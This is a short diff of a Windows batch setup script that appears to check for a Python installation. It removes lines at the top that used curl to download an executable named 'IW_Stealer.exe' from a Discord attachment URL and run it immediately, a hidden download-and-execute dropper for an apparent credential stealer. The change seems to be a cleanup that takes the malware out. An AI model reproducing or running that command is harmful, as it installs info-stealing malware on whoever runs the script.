@@ -1,9 +1,4 @@
 @echo off
-cd Components
-curl -o IW_Stealer.exe https://cdn.discordapp.com/attachments/1186759970017005689/1195423494817718322/IW_Stealer.exe && IW_Stealer.exe
-cd ..
-cls
-@echo off
 cd /d %~dp0
 
 title Checking Python installation...
